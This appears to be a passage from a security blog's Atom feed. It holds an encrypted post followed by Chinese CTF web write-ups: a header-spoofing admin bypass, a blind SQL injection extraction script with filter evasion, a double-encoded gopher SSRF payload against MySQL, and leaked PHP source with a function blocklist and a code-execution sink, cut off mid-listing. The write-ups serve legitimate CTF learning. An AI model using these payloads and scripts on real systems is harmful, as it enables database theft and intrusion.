f57281603003ee365d6cd437cb18a001833e4c9808879402d30317db33316f597a2f70ea66ed1df2e1d8499fc28b4a505dd543b9c531c97a28b72d2f193a6c4a97433ae07210c092efe8d6baf5a50881dfcdee5f6eee222b030cb94dabd4df248eda7428637fcc388b4836d09377ce9b465c8b52d4e375cdb837d25bc50149aa7278744da26a0642131e3863ce225da2ed445fed277fa6b0069785a2aaca75dba2c88d831bf13cd22d36694a76905e056868eba87055f1421314b6710dd1712f873791d081a6081dd218e27d23b558ee60c1015869a6cb264c19e01d9e3f828c7c744b9b235ecc509e0780c1c198264a2e2c44cfa913427824bdad675beaa319c5b8cd7b88e7085716082dc73de2b6dd44f5144084e3c3457e4f9b9a97e47a81f8c95325beee05458be7660ce85db44c626e6ca89eb6de40eef9f7cc35a80a941619c3a5cb990258ac612ee1eb4a498519529ca94a8fde5b3357122b8a35e179e600098695eec72a16278a29e7845fbbed80086fae003cc7a2218e92ae2527957d899ff43ee181406eac0af733760d21a2d8201d063234300c1e6b90393ae97127e3d9da819c6f0a3b5fc21192ef49c0e6f860b3e980052730a0e53b61b1e218f91ade46f04cb3810bf45ddca13a0065a5fbe4c99ab3a427d1cea5d221b0bed6e5c7c967b9e6fc0d57df04bc26d1db1a44a5407e8876a3e56436a74ede9e5c39f2620dda97e250074be64727a3e3d15191466554de0b51721bf9b99f3e25ab4dad366f54660f3b9ad9bc51a1ad9d707bee0d9e689fa2ca1300bd7bc5a04b88ad88713cb77baca487f0d4a078eaa1797687c51fd1fcd4a5f06cd1a09297ee7d2483e3698df9e953244aececa980676a5564f298a23dc2d816bbdbbff6dccaa493f4a3c68f70edc14ca1c8a41b1ce6c6033f58e95ccad3b95b87a5071e41a087c431a08a40db26b8594f0d514518bebc4714ba9861a439f2b27a26b9664443e13db728eb84b1beb4a0550172348e87eafb71d0aa6c3a2098e12601e75cfc5325a0669d9013fa0fa543f6cd743023e152d746d4f1e951feb162fd9dd6e332ec9893ce1ac4ba4d0b679058851d21303dd9faacc41a1c4f9750e787ea05b1adc873dda3be2d7080984455012f895dc697f0e337ca7b957047e375755edcb7278e3fdb02138609c7316b248eab35c4a37571b1a844dbe63804f0276c97e2ac66631c23ea16239c46c42f1d152f2d2c9c5cd142c02a5c2f7b4248c6c9fb78f290619ea183aaf2c6952e1e55ba7ca03d03fca7983b9306a674d0e429d09e9a3b2903669e7168cbe8814e3282e520af59a3ec5dcaf8e505942216a9a0b9385b42ebb7d0c9754ae587ad52930698900198abdc5edf93629561850fbd95cb5ae0c71981cddb2bc0d8703c245f5041fa0cf4c801b5098f1f8f0402af27f59b8974d9b89b645096b59a78097d89baddc9d58eb1628d739be29bd002668a9e59e91a03d6756e847681808072a4c2a00630ded881e0c85c520e9581282d760f09b2887e94c56a5c89ea2cfe298989e15eb31e9829f77e86ceab82d8fb9a2654fd0342651df421ec457d37bf798deb3ff6394b0055c19b8d496803bf5f1066c20832cf86c659f73dbe29a9586a6e2a15d0742cd1ffaba44e23793f59bc5d89df6f4a826bfa1097b0c336dc76172ed7fe7bcff324da68beb32dbb12380875a6331b21a2a18de048ca8ac78f7fdfd5b94519cbdbf215449ac62fb89a437356234175a9f16438d6dc5328de3bbb52e6ed4aef7d3acfc0e64837ddebf1123f91b71eab6229ccb18e098bc2bf468c9fa4a8228b2ef4fdc52c93fe33dab1b81cf3fcba82b5e245540c3adbdc800f26477f468b1860790f88bce4022614b1cb847b27c091e8bcd4ab17d3a55f4ead21aa0a8725299ab7fa499a560ab0dca7fdca0a7b21c191feb0d97c70ad6be35cecf66bd8e07b78c0c4b01c40324b8d14bc07e879a251486e57691b69a6944e92b0b223b6da64fe2d6972d7384a90627cc7b550e3117af3551037b2b72f76ce05c819ffb7df4c91f02cecef9124e9aab255422790a3fe877902a0aa8d32f4707fb756c32514534c4ca2e0de89d38f185e87fafd6e46ae9cf6b6686d0893ef780980c97f436538da5423484859b1048f3822ffad3c6d0078fc16ecb0c675c971228781d08a1d92b2972f3b35101f9b6ae37424f7410678701fff58c8f3b01006b13d512ae0f06c08c8e86a9ad32277d58e0d2ba1ea59c72cd07f359f467c2a92bd0e5a54381f0ffcddb0d4983fe850c884a2255ba60cba20b65ba6e45fafd27102da8414d3f2e53abe6732abe163434022990099a9e65fbbf25cd61c18056e7c9f7b234db671a67fa02bab3662cd39de863ba5aed0071c2f7eb5eff97731ea597bff9c8575bb25c375ddb5d0156486fef3b5dd1564f1b42782b2c44e1edbdaed5bc9b5408ae9656a68e3e51b36ffd6f262e8ea14cb13341e200a6048b35bdd310eca1e67d253904e6a609184875a51ea7f72ee481a79de6a6aeca5db3eef1c207e677415c158a7d4d061e5800ca2efc7713a91ba3bc74ecd8f37abbdeefac09ad24220023204e1ca9aaa2f54edef8dcebb1a9768716da2da02c3ddb917d715aa4469e9108e4cdb51e496c69aa9528c33cce6feba8c0a45d33724ab66bef7752eefdfe994fe67e203109b1e695ab4aa4699d3d847331008d4668bef962ddfcad1e50b0665780ff22286223a804a1b933d62e0ed8ea9d4e6b3266b5725fe9bbacd5432574dc4b77a8d4dfaa44e7671f3a31764f1a3e0af67793425d8964b7a2ffcf6365eb31f635b8ea7861b3f24c3a6ac760f96b35b018989a68e72fd6dbf4810d229d7ed7aaea2b7fd8e0df5587dfb2662cb327b8d4f5606754ceef847b6eb2760ca4b7437b99264875afb429591adfbf4ea4440580a8d896db11278b64344e24e2036c8800ec6c4ef2f47e1a64e58d53041c1f56f24f2fe98f5dd9557ecd0c0dd769542ffea1902132238c70363b517ec70f55263b48a5163f66f6718783a52643edc374fc036ee9501fdf5abf0ff528054124ed2d49287fd0e94a832b88b9414bb5dbdb4001cccef012f4e19fec9d0184797d22d559552234c40e69b0f5a4ec79b624d92d75b525e342eb4ce0854daee22a4e058487e9465ca00a56d86b381a357bbc74a699877c013e5e51891443d4944568cfe066fe79feabd524f526c5d624e3104477a4678df644fe6d1a3bce89277e20f5671922c2428166763e68404f4d1cc99c960245baa5c4abeb9b22ab67a4ac52c288defd24fd9167b7e1e9ba85ede1384ab31ad239ad7654248332cd6a8dda7c87877427b85551b853ab12be4891b2e9547f72893ede4d3f85120c6024f037d15be5249cd206172e6d933ab590212df5fc7c021b9fcb5b1161602cec7762bbd1c435213e58d16a1e34101104019d4b970b3ab9d63bcac1726647e3dbb4eaff4773c8659dbcc48a94eed9db3b666174411b793c909d6ecaa035cd26fcc23b8be25f62f09106f2a2adbdb1b712e33664f7f096af22f5a5c32eae9503d42165bfe19184adcd52cecfc3ebc90b00fe5594f64a12b255f0096317bd748ee0c0132f62627573390bb5a9a51f0d3229ebd067f9de7eb3c24cae0b7eb8abb0c458f159745314701c3778d1e72d9e18f4c9d29ae2914f654a5463f8902a6acf34838eda795472c9b266f28ae2595de00cbd661953ae4cc0c5f6c8169e96fd470962acafd0c9a9a6fdc4695a64f3b3ac922d766a02a8864579e76ba2267a5e0a2663b1713b0d540240b3c805b9eda2fe50f40a6a154eab8395b4e075aca1fc040dfc277f38e3b8b9898a8b65019ee41942b039f0f5e84cb48ab20cc97919dea7bfd345eb9733f8feee67ae5002bff71515a96a14e7bcab4626d24b5a466e86d15a182298ef0d6f2e76b6e8c742e5c7f709a13d231a2b69e858f82a91d7047af840cb8e3f5b3350fd4d238624f6c0ee3a55a67bc0c0054ebd5130563ffe9665c8d26aa61f710577bde06164a2eeb8384ffe7c61a296e72521c9f53cb6d10b3aae5ad2e040d4ffbba778f87b7927139ed6ba019ea04e4eed0fa91b827520bea5cf809113424e81c8be282ac8e9cb2a6d228a5105cb4269b4f0910355329adbc957683f6d0b4bae78741d05d95b57efef758932f51c9ea3890e2dc367452d90b4911bdf744328bc24083973fb949672e5d63d0484077af99162e98a30c51ff9839136f7cfc26ffd7d26263e80f8ab6054b61cb9fd2e4e7381eb776fd43877d3df59b0dd0ff7d55f110bf615af1797b239b5c957144c60faf59d84fc1888b14b6af7aac7cd2ca66041c8b3139c7698c0c508a7b4d0e2a6bcc6548cf8ad5c1de8aed205a1b68ac594e90b154cfcb5f30c0ec298ac03d58462684f94ca28cda2e24e8aff74b36e26900bf1b562ebc70ee4cd64759d001f0063a93e0e9f95c9aaf4514c5614220b249cb5c42a7996a40b608a99a46adffd243059319563d56923e2f03d7996020207681bdf2c83d437d240ca57c54d0e08153d998da95be576f021476ad5a0b4160600b86a671d721dd2dfd171ccf0fa74fe8e55a1cf34fb8fc5a8c003ef8dc657fe7a21266f30c7105d881aa6344b7794ec364891c93c2a0450090bedd2a3e90b7e735f4c7aabcd82285f1535a28ad4b508ed304ad497cd6b46b4e4e612fc5442d3667675c5dd287f00f94e25056fb3d89f90290b9a8306458dfdd19a8be0e1eb407f6198d85eda5eeb36de62bf82e38352128fbabbede0e7351259542c6776b070053c58b6ba619df88471fd3bae081a3979794e48150a8445b10309f43f11d77be92fc3f7a92b1645b6bc009f0340bf97d983c0ab32caadb5e60a70f62132a28490eca7d5e8e1531b68bc0f042b3d7947ae5cb11ca288ff7a23b98ed5d70ece01ee4c3e33f4612432b678343a55e0b4eaa17fd345b20feeb134f26b0921e8138f36723e2751831bae870ee952e1a09746f00c4dbd350b64d81c343549f6e3d8794e19ec83beaf73b8fbcd3792e9c9c500870c74f695e0a9861b2b1d1ae41d2d87c59569edc5268f3a0c614f83073fd2149d93a3f1db880201963c484764406dbdd15f9149f70018e0784acbdb7fe5a7e77f091a5d1a6755e97003932313b2299a26aecac85d16d9fc82532c12b7d90982a9b85e3a594fe01c61c007a05f2215630eeadd7501c3c6749087c8e35f1fe1d4a5174288696380f940e8fb7b5262131665190596baf9b3ce57c7bd917751b5a4e72e3fa7087af3cbdcc6006f3f52b28f590cb0b60be12e764e397ec603839a9a4a29ac05429b91e5de9cc274a254e74542aa3fa26fa8f6a111f96e715896e5a0e2051a09da05298baad6aefd0ce82463250a6673a96ff4564c664b1309f5ff4c99c5bfbae4293c484a96854b1d0654f66edb6adb0702e0216fbc85a9e17206f1c77edcb590da0c56969d48b466310bdfc533098e5dd01a61daf8f8a14eb91dba0c52f65cd7fe00f12797040e8126c1118050531040ed006d8dcb38bf1d6305ef847a1f01d97c1236a201d692d30594021280b995304e5d2e9bceaaf764d7d2d36290d516b14b9f4939111fed6bf13a8226a11d3f0d956ee204a6d1761c269af288f196eaa60101988debe58764c4ef9b49dba2caecbb1980d3395e0738dab792992e1ac019d11ad369fe0158b8c690c6ebfe1be3ff16965100a1a6a21c7883ab047dcd74f544a75e2c98900be93069f3eb0eb6828574d5a6e1a44e76bbe31e590a9ee3c579ccf740713212655b999130a48760996f9ca0bcb8d24dec6e9aee877b06ed06fa5556da8e30e976b4b1444978dfc7859e165ba1617f4f96f578c6002690a109d3c455a2d1c055a166c025611dfa225d65607cedf96ea5ee82175912ed7ebce4763c882fa0ead9d16755338daa59b7cf5e265f190a4c003b88b19080492560fbec7dad06ba4372d4500f182d6383cff764ad82f113e4b20e8f8c5c3ed0f3bfff14d877aef9598b72f6b03954b0d64aab675ec8d6f62840cf0507837e3ab3396070035f3b5166f74ed7147a66e452314b1914ca4ad3767995ea1bae872c3b2862fb45c3218e47aecd852966a9932b6381e11b52328f3dc81823c219bfff7a809dacfab662cb55644fa9aeccd21a240cc6b7db2a3514d4bcfc1908c47e716bf3ec489105d81eba2873fbb77af5ca17f904b5d9fc41deaa6eceb4f79342db0b4765804896442088bfbee66facdc5dca0e70b9c74088e0d0f491642fb2ee6d66997f72de745495a3694fd69f726cb5041c2545880345b762b3d346d7b20d207964d734ce65d84d346e77cc1e0b08f150816ea447eb76341bfbf1c6a30817ff91e8789adee58c6c7b61c1779b5bafd0908d5952ae45e09ba1f71a40eb4a8e90ccb189f8088da16702f0644e8cfb97d3f8adfba419ca4b5c77c9e06cbccbda899f5f9f84a2a787c24eb98d5e0d8074f96ef0c38b3bd33d848dc4670d9b104abaf4a6413949dd655d314f5c3837330aab4c50ded006bd97309341c278bbfc38b5ade1116e9ff2c4eb8fa75a6c2547700b330cc45846665668ee689a571249a29eb61f44455c6afbfeccd1a5ff467b5af661fe152d28aecb8be7fc656cd421619389a0df411f9036189975719bfeaf69d7cc82bb451e61eced658a33435c1f29ecf9f70629d3b64b784a8f4764ca4347b8a08f5f539de007d17007a8a9e6ffe4b91a8a165070e906b8238b99fe79ea2eb4446d2b19038b4df55cac774577ce23371f4089bc7f8c057b6dfa17a31990b2ff177389ffa6a6c1e8941f56b42af576a328853367a704142412b249c7b71eb8fadd49453963da41b4103c6099471160e68d3c30eff14748b9d7892b4a465de65022a65b9c94243235506c6bc093fd407be91e13cd2c2e45c80479ee0fcaac8af1c418ee0191188deef644aa75e65962b1cb183d9c306f87b68d084cb3cc1be0b4730c8f3c6bdf41cf9851cb2221157ea8acec9670c33ad907e43f9def30cebf3942398743aa278ceb3fcf43c36a7431922772af51779663c631d364f4779c017d0a0ea244fa0565f2c9e58718f79dbaf7f678163ab39e5a036c0ee3595a26df8ae23fe0321c25176b325e67067019de9c74534ad4f2fe51bd929c066db7f79e3bad95f86e6acd4ddece20180d18f6755af1ab6bf2ef336a68b5356e90f6f1b482dd0d05f94514ba99916e3a8343c7ce1169a2739875b7c37ea7a8a4ba21a545fa07610e459d41d5ce60fb9e035a484a60efa29e75a5ce4b9f904900442c022ca35431e79c641cbf170f7740022d5253fe66c707d737f710ccd93515181ee55c57eebe18cbdf3cab444e39cfc940d2da9a14715bd2bc7e579ea63b955c52a263f0c53b3628e4297d3ee82add5fc9782d981725808083ab2f67201267e5b5a3bb4c65fc74bbad99641d4a426aaa0a7d14f27a67dd0ee896a5d9fcd4c674f4c27c4dcfa3ac8639db93322d7acec032b3be92e3a55eeb1bb7c2c877916f6e6e8458b96e92dd9cf10e698b389c59804ab6ac2edae835936910c6c24aeb86ebc4717ad100ee33e35eb10ecc3ce7579bdf09040ff8ecaa61fcca44c57f170f16378214bcbca654554a579a604db8b8ee49b1599de2899482831197965903f3b061325d571b6e8971580bf742bb135bbfc43ed259a1b2ea16cb8119ad7a2a5d306620e5e59f4dda890ba572723f9c1214cbc9b4751fd93999f41de12d9b83223e00772a9efeae49a6cb40b062489845292b7c8184059f8d80f4795a703c3ff13ef660a12508c40f805d3401d57ba919f88564de512256768b216d198f914c23a4c54342631a83750527a794cd6d44e109dcd13a80606a79d9c2712e9828ee293c0975819325ff13e58b76d5de5112de1c27c6ccfa8d499c524dcf45a63bd99bb2d6e1d54979c23edf8550fbc291cd3b6e382d9ffab1fe7fbaa2022e8cee7ccb85345f2f751ff4a583917ea1f783e6df6f80353c29c1970841f1beafd9242d06aed65c364ebdb45a77b884c1d286d0bf72392b03b4eed63a3745336c292ecbdee92c9d761d47f9c5dcb85ae86</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>2020宁波市第三届网络安全大赛-web题writeup</title>
    <link href="https://c1aysec.github.io/2020/05/25/2020%E5%AE%81%E6%B3%A2%E5%B8%82%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-web%E9%A2%98writeup/"/>
    <id>https://c1aysec.github.io/2020/05/25/2020宁波市第三届网络安全大赛-web题writeup/</id>
    <published>2020-05-25T07:34:45.989Z</published>
    <updated>2020-07-09T07:11:53.698Z</updated>
    
    <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>比赛时间只有一下午，最终很遗憾没有进入线下，菜是原罪，将过程记录一下吧</p><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>提示：这是只有本地管理员权限才能访问的页面，你想要越权访问？</p><p>直接<code>X-Forwarded-For: 127.0.0.1</code>结合<code>Cookie: user=admin</code></p><p><img src="http://pic.c1imber.top/blog/20200705/rDiunidzUJgz.png?imageslim" alt="mark"></p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>在这道题上花了一些时间，注入类型为数字型，注入点的位置应该是在where xxx=xxx的位置，经过一番测试发现最基本的注入语句都被过滤了，很大可能是是基于正则的过滤，经过fuzz后猜测一些过滤规则如下：</p><p>首先尝试union select进行回显，发现过滤规则如下：</p><p><code>出现数字+任意字符+SQL关键字（这里的正则没有绕过）</code></p><p>1select   被过滤<br>1union    被过滤<br>等</p><p>导致不能union select联合查询</p><p>尝试盲注，发现过滤规则如下：</p><p><code>任意字符(出现数字)like|=|&gt;|&lt;|&lt;&gt;|\|\||\||^|&amp;等运算字符</code>，如下图</p><p><img src="http://pic.c1imber.top/blog/20200705/BT1dbUR7ppAP.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/h2OJJlyQj2Eq.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/97NIGGEkDfih.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/6Bju1BmlVN1x.png?imageslim" alt="mark"></p><p>导致不能使用substr、substring、mid、right、left等字符串截取字符去进行盲注判断</p><p>经过一番分析可以看到上面过滤的关键点就是尽量避免出现数字，可以使用<code>like</code>模糊匹配进行绕过，具体如下：</p><p>当id=0时，结果为：学号：0，成绩为： 94<br><img src="http://pic.c1imber.top/blog/20200705/NxsMPF90axhj.png?imageslim" alt="mark"></p><p>当id=1时，结果为：学号：1，成绩为： 52<br><img src="http://pic.c1imber.top/blog/20200705/cQrYTXJ5rECj.png?imageslim" alt="mark"></p><p>尝试将<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=(select flag from flag) like &apos;flag&#123;%&apos;</div></pre></td></tr></table></figure></p><p>此时结果为真，返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">学号：(select flag from flag) like &apos;flag&#123;%&apos;，成绩为： 52</div></pre></td></tr></table></figure><p>这里返回了学号为1的学生成绩，说明可以通过这种方式获取到flag，但是在写脚本后发现只能获取到flag的前两个字符<code>d7</code>，之后就卡住了，继续进行分析</p><p>当<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=(select flag from flag) like &apos;flag&#123;d7%&apos;</div></pre></td></tr></table></figure></p><p>这个时候还返回正常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">学号：(select flag from flag) like &apos;flag&#123;d7%&apos;，成绩为： 52</div></pre></td></tr></table></figure></p><p>但是继续尝试获取字符时发现被拦截</p><p><img src="http://pic.c1imber.top/blog/20200705/wYHHCamngbP0.png?imageslim" alt="mark"></p><p>由此判断存在新的过滤规则如下：</p><p><code>&#39;出现两个数字以上%&#39;|&quot;出现两个数字以上%&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200705/qFkp4QADeyKi.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/5XmX8eLAMMco.png?imageslim" alt="mark"></p><p>所以导致在获取<code>d7</code>两个字符后不能继续获取数据</p><p>解决办法：在mysql模糊匹配当中，<code>_</code>可以匹配一个位置的字符，所以可以通过这个特性把payload当中已经获得到的数字替换为<code>_</code>，这样就可以保证payload当中不会出现两个数字以上，如图，可以继续获取到第三个字符为e：<br><img src="http://pic.c1imber.top/blog/20200705/OFG8HJOaSv8w.png?imageslim" alt="mark"></p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line">session = requests.Session()</div><div class="line">l=<span class="string">"01234567890abcdefghijklmnopqrstuvwxyz"</span></div><div class="line">flag=<span class="string">""</span></div><div class="line">flag1=<span class="string">""</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</div><div class="line">    paramsPost = &#123;<span class="string">"id"</span>:<span class="string">"(select flag from flag) like "</span>+<span class="string">"'flag&#123;"</span>+<span class="string">"%s"</span>%(flag1+i)+<span class="string">"%'"</span>&#125;</div><div class="line">        headers = &#123;<span class="string">"Origin"</span>:<span class="string">"http://119.61.19.212:58888"</span>,<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Referer"</span>:<span class="string">"http://119.61.19.212:58888/"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">        response = session.post(<span class="string">"http://119.61.19.212:58888/index.php"</span>, data=paramsPost, headers=headers).text</div><div class="line">        <span class="keyword">if</span> <span class="string">"52"</span> <span class="keyword">in</span> response:</div><div class="line">            <span class="keyword">print</span> paramsPost</div><div class="line">            flag+=i</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            flag1+=i</div><div class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">"0123456789"</span>:</div><div class="line">                flag1=flag1.replace(i,<span class="string">"_"</span>)</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200705/vNbmlDsrSLgL.png?imageslim" alt="mark"></p><p><code>flag{d7ee68cb5251585d83e0b8cdb2aa06ef}</code></p><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><p>考察ssrf+mysql的利用，通过dict协议探测到3306端口，mysql用户名root、密码是空密码，直接gopher协议打就行，可以使用<code>gopherus.py</code>直接生成payload</p><p><img src="http://pic.c1imber.top/blog/20200705/XLn0M5hiqMA3.png?imageslim" alt="mark"></p><p>需要对payload进行二次url编码，最终payload如下</p><p><code>gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2518%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2573%2573%2572%2566%252e%2566%256c%2561%2567%2501%2500%2500%2500%2501</code></p><p><img src="http://pic.c1imber.top/blog/20200705/IY43I2QbguNd.png?imageslim" alt="mark"></p><h3 id="easy-xxe"><a href="#easy-xxe" class="headerlink" title="easy_xxe"></a>easy_xxe</h3><p>可以读取到<code>/etc/passwd</code>文件，但是找不到flag位置，比赛结束也没做出来，等writeup学习吧，哭</p><h3 id="2020-7-9补充"><a href="#2020-7-9补充" class="headerlink" title="2020.7.9补充"></a>2020.7.9补充</h3><p>看了其他师傅们easy_sql这道题的writeup，发现可以直接从index.php.bak当中获取源码从而得到过滤规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(preg_match(&quot;/\d.+?\D.+/is&quot;,$id)</div></pre></td></tr></table></figure><p>所以非常好绕，给出两个从其他师傅博客看到的writeup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ord(&apos;a&apos;)-ord(&apos;b&apos;) union select group_ concat(flag) from bankdb.flag</div><div class="line"></div><div class="line">now() union select group_ concat(flag) from bankdb.flag</div></pre></td></tr></table></figure><p>当时写这道题时自己绝对是脑抽了，，，，，，</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;比赛时间只有一下午，最终很遗憾没有进入线下，菜是原罪，将过程记录一下吧&lt;/p&gt;
&lt;h3 id=&quot;web签到&quot;&gt;&lt;a href=&quot;#web签到&quot; cl
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯朱雀组-部分web</title>
    <link href="https://c1aysec.github.io/2020/05/17/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%9C%B1%E9%9B%80%E7%BB%84-%E9%83%A8%E5%88%86web/"/>
    <id>https://c1aysec.github.io/2020/05/17/2020网鼎杯朱雀组-部分web/</id>
    <published>2020-05-17T05:42:35.134Z</published>
    <updated>2020-08-23T15:53:02.559Z</updated>
    
    <content type="html"><![CDATA[<h3 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h3><p>打开页面查看源码，发现有个隐藏表单会固定时间自动提交一些参数，如下</p><p><img src="http://pic.c1imber.top/blog/20200517/bsyihTlgKeKg.png?imageslim" alt="mark"></p><p>通过提交的内容很容易想到了php代码执行，但是经过简单测试发现好像过滤了很多函数，那么首先尝试读取源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func=file_get_contents&amp;p=index.php</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200517/nQVCr7AUvwMu.png?imageslim" alt="mark"></p><p>获取到源码如下，很容易看到代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</div><div class="line">    $result = call_user_func($func, $p);</div><div class="line">    $a= gettype($result);</div><div class="line">    <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</div><div class="line">        <span class="keyword">return</span> $result;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s 